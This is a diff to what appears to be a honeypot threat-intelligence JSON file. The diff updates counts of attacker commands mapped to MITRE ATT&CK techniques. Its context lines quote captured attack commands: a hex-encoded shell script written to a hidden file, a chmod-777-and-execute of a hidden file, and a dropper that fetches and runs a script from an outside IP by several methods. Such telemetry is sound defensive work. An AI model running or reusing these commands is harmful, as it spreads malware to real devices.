@@ -7,7 +7,7 @@
         "stealth"
       ],
       "url": "https://attack.mitre.org/techniques/T1027",
-      "count": 130107,
+      "count": 130115,
       "distinct_ips": 410,
       "examples": [
         "/bin/busybox echo -ne \"\\x23\\x21\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x0A\\x0A\\x66\\x6F\\x72\\x20\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x72\\x20\\x69\\x6E\\x20\\x2F\\x70\\x72\\x6F\\x63\" > .k",
@@ -24,7 +24,7 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 17029,
+      "count": 17044,
       "distinct_ips": 658,
       "examples": [
         ">/var/.f && chmod 777 /var/.f && /var/.f && cd /var/; ",
@@ -41,7 +41,7 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 2912,
+      "count": 2915,
       "distinct_ips": 440,
       "examples": [
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; /bin/busybox wget -q -O telnet2.sh http://176.65.139.157/telnet2.sh; busybox wget -q -O telnet2.sh http://176.65.139.157/telnet2.sh; wget -q -O telnet2.sh http://176.65.139.157/telnet2.sh; curl -s -o telnet2.sh http://176.65.139.157/telnet2.sh; busybox curl -s -o telnet2.sh http://176.65.139.157/telnet2.sh; tftp 176.65.139.157 -c get telnet2.sh; tftp -r telnet2.sh -g 176.65.139.157; ftpget -v -u anonymous -p anonymous -P 21 176.65.139.157 telnet2.sh telnet2.sh; chmod 777 telnet2.sh; sh telnet2.sh; rm -rf telnet2.sh",
@@ -184,6 +184,6 @@
       ]
     }
   ],
-  "total_commands": 414905,
-  "matched_commands": 148151
+  "total_commands": 414941,
+  "matched_commands": 148174
 }
